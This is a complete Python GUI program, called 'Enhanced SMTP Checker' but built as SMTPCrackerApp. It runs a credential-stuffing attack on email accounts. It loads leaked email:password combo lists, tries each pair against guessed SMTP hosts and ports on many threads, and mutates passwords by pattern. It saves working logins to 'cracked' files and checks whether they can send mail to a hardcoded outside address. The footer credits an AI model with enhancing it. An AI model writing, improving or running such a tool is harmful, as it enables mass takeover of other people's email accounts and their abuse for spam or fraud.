import sys
import os
import socket
import threading
import base64
import datetime
import ssl
import imaplib
import time
import re
import uuid
import requests
import queue
import logging
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
import webbrowser

# Configure logging
def setup_logging():
    """Setup logging configuration for the application."""
    log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    logging.basicConfig(
        level=logging.INFO,
        format=log_format,
        handlers=[
            logging.FileHandler('smtp_checker.log'),
            logging.StreamHandler(sys.stdout)
        ]
    )
    return logging.getLogger(__name__)

logger = setup_logging()

class AdvancedSettingsDialog(tk.Toplevel):
    """Dialog for advanced SMTP checker settings."""
    def __init__(self, parent, config):
        super().__init__(parent)
        self.title('Advanced Settings')
        self.config = config
        self.parent = parent
        
        # Make dialog modal
        self.transient(parent)
        self.grab_set()
        
        # Configure window
        self.geometry('500x400')
        self.resizable(False, False)
        
        # Initialize UI
        self.create_widgets()
        
        # Center dialog on parent
        self.center_on_parent()

    def create_widgets(self):
        """Create the dialog widgets."""
        main_frame = ttk.Frame(self, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # SMTP Hosts
        ttk.Label(main_frame, text="SMTP Hosts (one per line):").pack(anchor=tk.W, pady=(0, 5))
        self.hosts_text = scrolledtext.ScrolledText(main_frame, height=6)
        self.hosts_text.pack(fill=tk.X, pady=(0, 10))
        hosts = self.config.get('smtp_hosts', [])
        self.hosts_text.insert('1.0', '\n'.join(hosts))
        
        # SMTP Ports
        ttk.Label(main_frame, text="SMTP Ports (comma-separated):").pack(anchor=tk.W, pady=(0, 5))
        self.ports_entry = ttk.Entry(main_frame)
        self.ports_entry.pack(fill=tk.X, pady=(0, 10))
        ports = self.config.get('smtp_ports', [])
        self.ports_entry.insert(0, ','.join(map(str, ports)))
        
        # Connection Timeout
        ttk.Label(main_frame, text="Connection Timeout (seconds):").pack(anchor=tk.W, pady=(0, 5))
        self.timeout_entry = ttk.Entry(main_frame)
        self.timeout_entry.pack(fill=tk.X, pady=(0, 10))
        self.timeout_entry.insert(0, str(self.config.get('connection_timeout', 13)))
        
        # Test Email
        ttk.Label(main_frame, text="Test Email Address:").pack(anchor=tk.W, pady=(0, 5))
        self.test_email_entry = ttk.Entry(main_frame)
        self.test_email_entry.pack(fill=tk.X, pady=(0, 10))
        self.test_email_entry.insert(0, self.config.get('test_email', ''))
        
        # Save Results Options
        self.save_results_var = tk.BooleanVar(value=self.config.get('save_results', True))
        ttk.Checkbutton(main_frame, text="Save Results", variable=self.save_results_var).pack(anchor=tk.W, pady=(0, 5))
        
        # Buttons
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=(10, 0))
        ttk.Button(button_frame, text="Save", command=self.save_settings).pack(side=tk.RIGHT, padx=5)
        ttk.Button(button_frame, text="Cancel", command=self.destroy).pack(side=tk.RIGHT)

    def save_settings(self):
        """Save the modified settings."""
        try:
            # Save SMTP hosts
            hosts = [h.strip() for h in self.hosts_text.get('1.0', tk.END).splitlines() if h.strip()]
            self.config.set('smtp_hosts', hosts)
            
            # Save ports
            ports = [int(p.strip()) for p in self.ports_entry.get().split(',') if p.strip()]
            self.config.set('smtp_ports', ports)
            
            # Save timeout
            timeout = int(self.timeout_entry.get())
            self.config.set('connection_timeout', timeout)
            
            # Save test email
            self.config.set('test_email', self.test_email_entry.get().strip())
            
            # Save results option
            self.config.set('save_results', self.save_results_var.get())
            
            self.destroy()
            messagebox.showinfo("Success", "Settings saved successfully!")
            
        except ValueError as e:
            messagebox.showerror("Error", f"Invalid input: {str(e)}")
    
    def center_on_parent(self):
        """Center the dialog on the parent window."""
        self.update_idletasks()
        parent_x = self.parent.winfo_rootx()
        parent_y = self.parent.winfo_rooty()
        parent_width = self.parent.winfo_width()
        parent_height = self.parent.winfo_height()
        
        dialog_width = self.winfo_width()
        dialog_height = self.winfo_height()
        
        x = parent_x + (parent_width - dialog_width) // 2
        y = parent_y + (parent_height - dialog_height) // 2
        
        self.geometry(f"+{x}+{y}")

class ConfigManager:
    """Configuration manager for SMTP Checker settings."""

    def __init__(self, config_file='smtp_config.json'):
        self.config_file = config_file
        self.default_config = {
            'smtp_hosts': ["", "smtp.", "mail.", "webmail.", "secure.", "plus.smtp.",
                          "smtp.mail.", "smtp.att.", "pop3.", "securesmtp.", "outgoing.",
                          "smtp-mail.", "plus.smtp.mail.", "Smtpauths.", "Smtpauth."],
            'smtp_ports': [587, 465, 25],
            'connection_timeout': 13,
            'max_threads': 1000,
            'default_threads': 50,
            'test_email': "test@example.com",
            'save_results': True,
            'results_format': 'both',  # 'smtp', 'mailaccess', 'both'
            'log_level': 'INFO',
            'auto_save_config': True
        }
        self.config = self.load_config()

    def load_config(self):
        """Load configuration from file or create default."""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                # Merge with defaults to ensure all keys exist
                merged_config = self.default_config.copy()
                merged_config.update(config)
                return merged_config
            else:
                self.save_config(self.default_config)
                return self.default_config.copy()
        except Exception as e:
            logger.error(f"Error loading config: {e}")
            return self.default_config.copy()

    def save_config(self, config=None):
        """Save configuration to file."""
        try:
            config_to_save = config or self.config
            with open(self.config_file, 'w') as f:
                json.dump(config_to_save, f, indent=4)
            logger.info(f"Configuration saved to {self.config_file}")
        except Exception as e:
            logger.error(f"Error saving config: {e}")

    def get(self, key, default=None):
        """Get configuration value."""
        return self.config.get(key, default)

    def set(self, key, value):
        """Set configuration value."""
        self.config[key] = value
        if self.config.get('auto_save_config', True):
            self.save_config()

class SMTPCrackerApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title('Enhanced SMTP Checker v2.0')
        self.geometry('800x700')
        self.configure(bg='#f0f0f0')
        self.resizable(True, True)

        # Initialize configuration manager
        self.config = ConfigManager()

        # Initialize counters and flags
        self.good_count = 0
        self.bad_count = 0
        self.total_count = 0
        self.processed_count = 0
        self.stop_flag = threading.Event()
        self.is_running = False

        # Initialize UI
        self.initUI()

        # Center window on screen
        self.center_window()

        # Load saved settings
        self.load_settings()

    def center_window(self):
        """Center the window on the screen."""
        self.update_idletasks()
        width = self.winfo_width()
        height = self.winfo_height()
        x = (self.winfo_screenwidth() // 2) - (width // 2)
        y = (self.winfo_screenheight() // 2) - (height // 2)
        self.geometry(f'{width}x{height}+{x}+{y}')

    def initUI(self):
        """Initialize the enhanced user interface."""
        # Create main container with padding
        main_frame = tk.Frame(self, bg='#f0f0f0', padx=20, pady=20)
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Title
        title_label = tk.Label(main_frame, text='Enhanced SMTP Checker v2.0',
                              font=('Arial', 16, 'bold'), bg='#f0f0f0', fg='#2c3e50')
        title_label.pack(pady=(0, 20))

        # Configuration Frame
        config_frame = tk.LabelFrame(main_frame, text='Configuration',
                                   font=('Arial', 10, 'bold'), bg='#f0f0f0', fg='#34495e')
        config_frame.pack(fill=tk.X, pady=(0, 15))

        # Combo file selection
        file_frame = tk.Frame(config_frame, bg='#f0f0f0')
        file_frame.pack(fill=tk.X, padx=10, pady=10)

        tk.Label(file_frame, text='Combo File:', font=('Arial', 9),
                bg='#f0f0f0', fg='#2c3e50').pack(anchor=tk.W)

        file_input_frame = tk.Frame(file_frame, bg='#f0f0f0')
        file_input_frame.pack(fill=tk.X, pady=(5, 0))

        self.combo_entry = tk.Entry(file_input_frame, font=('Arial', 9), width=60)
        self.combo_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)

        self.combo_button = tk.Button(file_input_frame, text='Browse',
                                    command=self.browse_combo_file, font=('Arial', 9),
                                    bg='#3498db', fg='white', padx=15)
        self.combo_button.pack(side=tk.RIGHT, padx=(10, 0))

        # Thread configuration
        thread_frame = tk.Frame(config_frame, bg='#f0f0f0')
        thread_frame.pack(fill=tk.X, padx=10, pady=(0, 10))

        tk.Label(thread_frame, text='Number of Threads:', font=('Arial', 9),
                bg='#f0f0f0', fg='#2c3e50').pack(anchor=tk.W)

        self.threads_entry = tk.Entry(thread_frame, font=('Arial', 9), width=10)
        self.threads_entry.insert(0, str(self.config.get('default_threads', 50)))
        self.threads_entry.pack(anchor=tk.W, pady=(5, 0))

        # Advanced settings button
        advanced_frame = tk.Frame(config_frame, bg='#f0f0f0')
        advanced_frame.pack(fill=tk.X, padx=10, pady=(0, 10))

        self.advanced_button = tk.Button(advanced_frame, text='Advanced Settings',
                                       command=self.show_advanced_settings, font=('Arial', 9),
                                       bg='#95a5a6', fg='white', padx=15)
        self.advanced_button.pack(anchor=tk.W)

        # Control buttons frame
        control_frame = tk.Frame(main_frame, bg='#f0f0f0')
        control_frame.pack(fill=tk.X, pady=(0, 15))

        self.start_button = tk.Button(control_frame, text='Start Checking',
                                    command=self.start_cracking, font=('Arial', 10, 'bold'),
                                    bg='#27ae60', fg='white', padx=20, pady=5)
        self.start_button.pack(side=tk.LEFT, padx=(0, 10))

        self.stop_button = tk.Button(control_frame, text='Stop',
                                   command=self.stop_cracking, font=('Arial', 10, 'bold'),
                                   bg='#e74c3c', fg='white', padx=20, pady=5, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT)

        # Progress and Statistics Frame
        stats_frame = tk.LabelFrame(main_frame, text='Progress & Statistics',
                                  font=('Arial', 10, 'bold'), bg='#f0f0f0', fg='#34495e')
        stats_frame.pack(fill=tk.X, pady=(0, 15))

        # Progress bar
        progress_frame = tk.Frame(stats_frame, bg='#f0f0f0')
        progress_frame.pack(fill=tk.X, padx=10, pady=10)

        tk.Label(progress_frame, text='Progress:', font=('Arial', 9),
                bg='#f0f0f0', fg='#2c3e50').pack(anchor=tk.W)

        self.progress_var = tk.StringVar(value="Ready to start...")
        self.progress_label = tk.Label(progress_frame, textvariable=self.progress_var,
                                     font=('Arial', 9), bg='#f0f0f0', fg='#7f8c8d')
        self.progress_label.pack(anchor=tk.W, pady=(2, 5))

        self.progress_bar = ttk.Progressbar(progress_frame, mode='determinate', length=400)
        self.progress_bar.pack(fill=tk.X, pady=(0, 5))

        # Statistics
        stats_inner_frame = tk.Frame(stats_frame, bg='#f0f0f0')
        stats_inner_frame.pack(fill=tk.X, padx=10, pady=(0, 10))

        self.good_label = tk.Label(stats_inner_frame, text='✓ Valid: 0',
                                 font=('Arial', 10, 'bold'), bg='#f0f0f0', fg='#27ae60')
        self.good_label.pack(side=tk.LEFT, padx=(0, 20))

        self.bad_label = tk.Label(stats_inner_frame, text='✗ Invalid: 0',
                                font=('Arial', 10, 'bold'), bg='#f0f0f0', fg='#e74c3c')
        self.bad_label.pack(side=tk.LEFT, padx=(0, 20))

        self.total_label = tk.Label(stats_inner_frame, text='Total: 0',
                                  font=('Arial', 10), bg='#f0f0f0', fg='#34495e')
        self.total_label.pack(side=tk.LEFT)

        # Log area
        log_frame = tk.LabelFrame(main_frame, text='Activity Log',
                                font=('Arial', 10, 'bold'), bg='#f0f0f0', fg='#34495e')
        log_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 15))

        self.log_text = scrolledtext.ScrolledText(log_frame, state='disabled',
                                                width=80, height=15, font=('Consolas', 9),
                                                bg='#2c3e50', fg='#ecf0f1', insertbackground='white')
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Footer
        footer_frame = tk.Frame(main_frame, bg='#f0f0f0')
        footer_frame.pack(fill=tk.X)

        self.developer_label = tk.Label(footer_frame, text="Enhanced by AI Assistant | Original by Zied Boughdir 2024",
                                      font=('Arial', 8), bg='#f0f0f0', fg='#7f8c8d')
        self.developer_label.pack(side=tk.LEFT)

        self.github_link = tk.Label(footer_frame, text="GitHub: https://github.com/zinzied",
                                  font=('Arial', 8), bg='#f0f0f0', fg='#3498db', cursor="hand2")
        self.github_link.pack(side=tk.RIGHT)
        self.github_link.bind("<Button-1>", lambda e: webbrowser.open("https://github.com/zinzied"))

    def load_settings(self):
        """Load settings from configuration."""
        # Set thread count from config
        self.threads_entry.delete(0, tk.END)
        self.threads_entry.insert(0, str(self.config.get('default_threads', 50)))

    def save_settings(self):
        """Save current settings to configuration."""
        try:
            thread_count = int(self.threads_entry.get())
            self.config.set('default_threads', thread_count)
        except ValueError:
            pass  # Keep existing value if invalid

    def show_advanced_settings(self):
        """Show advanced settings dialog."""
        AdvancedSettingsDialog(self, self.config)

    def browse_combo_file(self):
        filename = filedialog.askopenfilename(filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if filename:
            self.combo_entry.insert(0, filename)

    def log(self, message, level='INFO'):
        """Enhanced logging with different levels and proper formatting."""
        try:
            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
            formatted_message = f"[{timestamp}] {message}"

            # Log to GUI
            self.log_text.config(state='normal')
            self.log_text.insert(tk.END, formatted_message + '\n')
            self.log_text.config(state='disabled')
            self.log_text.yview(tk.END)

            # Log to file and console based on level
            if level == 'ERROR':
                logger.error(message)
            elif level == 'WARNING':
                logger.warning(message)
            elif level == 'DEBUG':
                logger.debug(message)
            else:
                logger.info(message)

        except Exception as e:
            # Fallback logging if GUI logging fails
            logger.error(f"Failed to log message: {e}")
            print(f"Log error: {e}")  # Emergency fallback

    def update_counters(self):
        """Update the counter displays and progress bar."""
        self.good_label.config(text=f"✓ Valid: {self.good_count}")
        self.bad_label.config(text=f"✗ Invalid: {self.bad_count}")
        self.total_label.config(text=f"Total: {self.total_count}")

        # Update progress
        if self.total_count > 0:
            progress_percent = (self.processed_count / self.total_count) * 100
            self.progress_bar['value'] = progress_percent
            self.progress_var.set(f"Processed: {self.processed_count}/{self.total_count} ({progress_percent:.1f}%)")
        else:
            self.progress_bar['value'] = 0
            self.progress_var.set("Ready to start...")

    def increment_good(self):
        """Increment good counter and update displays."""
        self.good_count += 1
        self.processed_count += 1
        self.update_counters()

    def increment_bad(self):
        """Increment bad counter and update displays."""
        self.bad_count += 1
        self.processed_count += 1
        self.update_counters()

    def set_total_count(self, count):
        """Set the total number of items to process."""
        self.total_count = count
        self.processed_count = 0
        self.update_counters()

    def set_running_state(self, is_running):
        """Update UI state based on running status."""
        self.is_running = is_running
        if is_running:
            self.start_button.config(state=tk.DISABLED, text="Running...")
            self.stop_button.config(state=tk.NORMAL)
            self.combo_button.config(state=tk.DISABLED)
            self.threads_entry.config(state=tk.DISABLED)
        else:
            self.start_button.config(state=tk.NORMAL, text="Start Checking")
            self.stop_button.config(state=tk.DISABLED)
            self.combo_button.config(state=tk.NORMAL)
            self.threads_entry.config(state=tk.NORMAL)

    def start_cracking(self):
        """Start the SMTP cracking process with enhanced validation and error handling."""
        try:
            # Validate combo file
            combo_file = self.combo_entry.get().strip()
            if not combo_file:
                messagebox.showerror("Error", "Please provide a combo file.")
                self.log("Error: No combo file specified", 'ERROR')
                return

            if not os.path.exists(combo_file):
                messagebox.showerror("Error", f"Combo file not found: {combo_file}")
                self.log(f"Error: Combo file not found: {combo_file}", 'ERROR')
                return

            # Validate file is readable
            try:
                with open(combo_file, 'r') as f:
                    first_line = f.readline()
                    if not first_line.strip():
                        messagebox.showerror("Error", "Combo file appears to be empty.")
                        self.log("Error: Combo file is empty", 'ERROR')
                        return
            except Exception as e:
                messagebox.showerror("Error", f"Cannot read combo file: {str(e)}")
                self.log(f"Error reading combo file: {str(e)}", 'ERROR')
                return

            # Validate thread count
            try:
                thread_count = int(self.threads_entry.get())
                if thread_count <= 0:
                    raise ValueError("Thread count must be positive")
                if thread_count > 1000:
                    if not messagebox.askyesno("Warning",
                        f"High thread count ({thread_count}) may cause system instability. Continue?"):
                        return
                    self.log(f"Warning: Using high thread count: {thread_count}", 'WARNING')
            except ValueError as e:
                messagebox.showerror("Error", f"Invalid thread count: {str(e)}")
                self.log(f"Error: Invalid thread count: {str(e)}", 'ERROR')
                return

            # Reset counters and UI state
            self.good_count = 0
            self.bad_count = 0
            self.set_total_count(0)  # Will be updated when file is processed
            self.set_running_state(True)

            self.log(f"Starting SMTP Checker with {thread_count} threads...")
            self.log(f"Processing combo file: {combo_file}")

            self.stop_flag.clear()
            self.thread = threading.Thread(
                target=self.crack_smtp,
                args=(combo_file, thread_count),
                daemon=True  # Ensure thread doesn't prevent app shutdown
            )
            self.thread.start()

        except Exception as e:
            error_msg = f"Unexpected error starting SMTP checker: {str(e)}"
            messagebox.showerror("Error", error_msg)
            self.log(error_msg, 'ERROR')
            logger.exception("Exception in start_cracking")

    def stop_cracking(self):
        """Stop the SMTP checking process."""
        self.log("Stopping SMTP Checker...")
        self.stop_flag.set()
        self.set_running_state(False)
        self.progress_var.set("Stopping...")

    def crack_smtp(self, combo_file, thread_count):
        """Enhanced SMTP cracking method with better error handling and progress tracking."""
        try:
            # Read and validate input file
            self.log("Reading combo file...")
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                inputs = [line.strip() for line in f.readlines() if line.strip()]

            if not inputs:
                self.log("Error: Combo file is empty or contains no valid entries", 'ERROR')
                return

            self.log(f"Loaded {len(inputs)} entries from combo file")

            # Validate combo format
            valid_inputs = []
            for i, line in enumerate(inputs):
                if ':' not in line:
                    self.log(f"Warning: Skipping invalid line {i+1}: {line[:50]}...", 'WARNING')
                    continue

                parts = line.split(':')
                if len(parts) < 2:
                    self.log(f"Warning: Skipping incomplete line {i+1}: {line[:50]}...", 'WARNING')
                    continue

                email_part = parts[0].strip()
                if '@' not in email_part:
                    self.log(f"Warning: Skipping invalid email {i+1}: {email_part}", 'WARNING')
                    continue

                valid_inputs.append(line)

            if not valid_inputs:
                self.log("Error: No valid email:password combinations found", 'ERROR')
                return

            self.log(f"Processing {len(valid_inputs)} valid entries with {thread_count} threads")
            self.set_total_count(len(valid_inputs))

            # Initialize queue and start workers
            work_queue = queue.Queue(maxsize=20000)

            with ThreadPoolExecutor(max_workers=thread_count) as executor:
                # Start consumer threads
                consumers_started = 0
                for i in range(thread_count):
                    try:
                        consumer = Consumer(work_queue, self.log, self.increment_good,
                                          self.increment_bad, self.stop_flag)
                        executor.submit(consumer.run)
                        consumers_started += 1
                    except Exception as e:
                        self.log(f"Failed to start consumer thread {i+1}: {str(e)}", 'ERROR')
                        if consumers_started == 0:
                            self.log("Error: Could not start any worker threads", 'ERROR')
                            return
                        break

                self.log(f"Started {consumers_started} worker threads")

                # Process inputs
                processed = 0
                try:
                    for line in valid_inputs:
                        if self.stop_flag.is_set():
                            self.log("Stopping due to user request...")
                            break

                        try:
                            parts = line.split(':')
                            user = parts[0].strip().lower()
                            password = ':'.join(parts[1:]).strip()  # Handle passwords with colons

                            if '@' in user:
                                domain = user.split('@')[1]
                                work_queue.put((domain, user, password))
                                processed += 1

                                # Progress update every 100 items
                                if processed % 100 == 0:
                                    self.log(f"Queued {processed}/{len(valid_inputs)} entries...")

                        except Exception as e:
                            self.log(f"Error processing line: {line[:50]}... - {str(e)}", 'ERROR')
                            continue

                except Exception as e:
                    self.log(f"Error during input processing: {str(e)}", 'ERROR')

                self.log(f"Queued {processed} entries for processing")

                # Wait for completion
                work_queue.join()

        except FileNotFoundError:
            self.log(f"Error: Combo file not found: {combo_file}", 'ERROR')
        except PermissionError:
            self.log(f"Error: Permission denied reading file: {combo_file}", 'ERROR')
        except Exception as e:
            self.log(f"Unexpected error in crack_smtp: {str(e)}", 'ERROR')
            logger.exception("Exception in crack_smtp")
        finally:
            self.log("SMTP checking process completed.")
            self.log(f"Final results - Valid: {self.good_count}, Invalid: {self.bad_count}")
            self.set_running_state(False)
            if self.processed_count >= self.total_count:
                self.progress_var.set("Completed!")
            else:
                self.progress_var.set("Stopped by user")

class Consumer(threading.Thread):
    def __init__(self, qu, log_func, increment_good, increment_bad, stop_flag):
        super().__init__()
        self.q = qu
        self.log = log_func
        self.increment_good = increment_good
        self.increment_bad = increment_bad
        self.stop_flag = stop_flag
        self.hosts = ["", "smtp.", "mail.", "webmail.", "secure.", "plus.smtp.", "smtp.mail.", "smtp.att.", "pop3.", "securesmtp.", "outgoing.", "smtp-mail.", "plus.smtp.mail.", "Smtpauths.", "Smtpauth."]
        self.ports = [587, 465, 25]
        self.timeout = 13

    def sendCmd(self, sock, cmd):
        sock.send(cmd.encode() + b"\r\n")
        return sock.recv(900000)

    def addBad(self, ip):
        global bads, rbads
        if rbads:
            bads.append(ip)
        self.increment_bad()
        return -1

    def findHost(self, host):
        self.log(f"Searching smtp host and port on {host}")
        global cache, bads, rbads
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(0)
        s.settimeout(self.timeout)
        try:
            d = cache[host]
            try:
                if self.ports[d[1]] == 465:
                    s = ssl.wrap_socket(s)
                s.connect((self.hosts[d[0]] + host, self.ports[d[1]]))
                return s
            except Exception as e:
                self.log(f"Connection failed for cached host {host}: {str(e)}", 'DEBUG')
                if rbads:
                    bads.append(host)
                return None
        except KeyError:
            pass
        cache[host] = [-1, -1]
        for i, p in enumerate(self.ports):
            for j, h in enumerate(self.hosts):
                self.log(f"Trying connection on {h}{host}:{p}")
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setblocking(0)
                    s.settimeout(self.timeout)
                    if p == 465:
                        s = ssl.wrap_socket(s)
                    s.connect((h + host, p))
                    cache[host] = [j, i]
                    return s
                except Exception as e:
                    self.log(f"Connection attempt failed for {h}{host}:{p} - {str(e)}", 'DEBUG')
                    continue
        bads.append(host)
        del cache[host]
        return None

    def getPass(self, passw, user, domain):
        passw = str(passw)
        if '%null%' in passw:
            return ""
        elif '%user%' in passw:
            user = user.replace('-', '').replace('.', '').replace('_', '')
            return passw.replace('%user%', user)
        elif '%User%' in user:
            user = user.replace('-', '').replace('.', '').replace('_', '')
            return passw.replace('%User%', user)
        elif '%special%' in user:
            user = user.replace('-', '').replace('.', '').replace('_', '').replace('e', '3').replace('i', '1').replace('a', '@')
            return passw.replace('%special%', user)
        elif '%domain%' in passw:
            return passw.replace('%domain%', domain.replace("-", ""))
        if '%part' in passw:
            if '-' in user:
                parts = user.split('-')
            elif '.' in user:
                parts = user.split('.')
            elif '_' in user:
                parts = user.split('_')
            try:
                h = passw.replace('%part', '').split('%')[0]
                i = int(h)
                p = passw.replace('%part' + str(i) + '%', parts[i - 1])
                return p
            except Exception as e:
                self.log(f"Error parsing password pattern: {str(e)}", 'DEBUG')
                return None
        return passw

    def connect(self, tupple):
        """Enhanced connect method with better error handling and logging."""
        global bads, cracked, cache, email

        try:
            host = tupple[0].rstrip()
            host1 = host
            user = tupple[1].rstrip()

            # Skip if already processed
            if host1 in cracked or host1 in bads:
                return 0

            # Process password with pattern replacement
            passw = self.getPass(tupple[2].rstrip(), user.rstrip().split('@')[0], host.rstrip().split('.')[0])
            if passw is None:
                self.log(f"Invalid password pattern for {user}", 'DEBUG')
                return 0

            # Check cache for failed hosts
            try:
                if cache[host][0] == -1:
                    return 0
            except KeyError:
                pass

            # Find and connect to host
            s = self.findHost(host)
            if s is None:
                return -1

            # Get connection details
            port = str(self.ports[cache[host][1]])
            port_display = port + "(SSL)" if port == "465" else port
            host_display = self.hosts[cache[host][0]] + host

            self.log(f"Testing: {host_display}:{port_display} | {user}:{passw}")

        except Exception as e:
            self.log(f"Error preparing connection for {tupple}: {str(e)}", 'ERROR')
            return -1

        # Attempt SMTP authentication
        try:
            # Read server banner
            banner = s.recv(1024)
            if banner[0:3] != b"220":
                self.log(f"Invalid banner from {host_display}: {banner[:50]}", 'DEBUG')
                self.sendCmd(s, 'QUIT')
                s.close()
                return self.addBad(host1)

            # Send EHLO command
            rez = self.sendCmd(s, "EHLO ADMIN")

            # Initiate AUTH LOGIN
            rez = self.sendCmd(s, "AUTH LOGIN")
            if rez[0:3] != b'334':
                self.log(f"AUTH LOGIN not supported on {host_display}: {rez[:50]}", 'DEBUG')
                self.sendCmd(s, 'QUIT')
                s.close()
                return self.addBad(host1)

            # Send username
            rez = self.sendCmd(s, base64.b64encode(user.encode()).decode())
            if rez[0:3] != b'334':
                self.log(f"Username rejected on {host_display}: {rez[:50]}", 'DEBUG')
                self.sendCmd(s, 'QUIT')
                s.close()
                return self.addBad(host1)

            # Send password
            rez = self.sendCmd(s, base64.b64encode(passw.encode()).decode())
            if rez[0:3] != b"235" or b'fail' in rez.lower():
                self.log(f"Authentication failed for {user} on {host_display}", 'DEBUG')
                self.sendCmd(s, 'QUIT')
                s.close()
                return 0

            # Success! Log and save results
            success_msg = f"✓ SUCCESS: {host_display}:{port_display} | {user}:{passw}"
            self.log(success_msg)

            # Save to files with better error handling
            try:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open('cracked_smtps.txt', 'a', encoding='utf-8') as save:
                    save.write(f"{timestamp},{host_display},{port},{user},{passw}\n")
                with open('cracked_Mailaccess.txt', 'a', encoding='utf-8') as save:
                    save.write(f"{user}:{passw}\n")
            except Exception as e:
                self.log(f"Error saving results: {str(e)}", 'ERROR')

            cracked.append(host1)
            self.increment_good()

            # Test mail sending capability (optional)
            try:
                rez = self.sendCmd(s, "RSET")
                if rez[0:3] == b'250':
                    rez = self.sendCmd(s, f"MAIL FROM: <{user}>")
                    if rez[0:3] == b'250':
                        rez = self.sendCmd(s, f"RCPT TO: <{email}>")
                        if rez[0:3] == b'250':
                            self.log(f"Mail sending capability confirmed for {user}", 'DEBUG')
                            rez = self.sendCmd(s, 'DATA')
            except Exception as e:
                self.log(f"Error testing mail capability: {str(e)}", 'DEBUG')

            # Clean disconnect
            try:
                self.sendCmd(s, 'QUIT')
                s.close()
            except:
                pass

        except socket.timeout:
            self.log(f"Timeout connecting to {host_display}", 'DEBUG')
            try:
                s.close()
            except:
                pass
            return self.addBad(host1)
        except ConnectionResetError:
            self.log(f"Connection reset by {host_display}", 'DEBUG')
            try:
                s.close()
            except:
                pass
            return self.addBad(host1)
        except Exception as e:
            self.log(f"Connection error for {host_display}: {str(e)}", 'DEBUG')
            try:
                s.close()
            except:
                pass
            return self.addBad(host1)

    def run(self):
        """Enhanced run method with better error handling and graceful shutdown."""
        try:
            while True:
                if self.stop_flag.is_set():
                    self.log("Worker thread stopping due to stop flag", 'DEBUG')
                    break

                try:
                    # Get work item with timeout to allow periodic stop flag checks
                    cmb = self.q.get(timeout=1.0)

                    # Process the connection
                    self.connect(cmb)

                    # Mark task as done
                    self.q.task_done()

                except queue.Empty:
                    # Timeout occurred, check stop flag and continue
                    continue
                except Exception as e:
                    self.log(f"Error processing queue item: {str(e)}", 'ERROR')
                    try:
                        self.q.task_done()
                    except:
                        pass
                    continue

        except Exception as e:
            self.log(f"Fatal error in worker thread: {str(e)}", 'ERROR')
            logger.exception("Fatal error in Consumer.run")
        finally:
            self.log("Worker thread terminated", 'DEBUG')

if __name__ == "__main__":
    # Initialize global variables
    tld = []
    tlds = {}
    cache = {}
    bads = []
    cracked = []
    rbads = 0
    randomString = uuid.uuid4().hex.upper()[0:7]
    email = "zinzied@protonmail.com"  # Placeholder email for testing

    app = SMTPCrackerApp()
    app.mainloop()
